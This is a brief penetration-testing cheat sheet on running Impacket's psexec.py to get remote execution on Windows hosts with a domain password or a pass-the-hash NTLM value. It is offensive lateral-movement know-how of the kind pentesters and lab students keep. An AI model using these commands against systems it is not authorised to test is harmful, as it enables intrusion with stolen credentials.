**NOTE**: You must be local administrator or Domain Admin to use psexec.

> If you have a set of credentials:

```
rlwrap psexec.py <domain>/<user>:<pass>@<ip>  
```

> If specifying the domain dosent work consider specifying the hostname with it as seen below:

```
psexec.py ms01.domain.com/<user>:<pass>@<ip>  
```

> If you have a hash:

```
psexec.py -hashes 00000000000000000000000000000000:<ntlm_hash> <username>@<target_ip> 
```

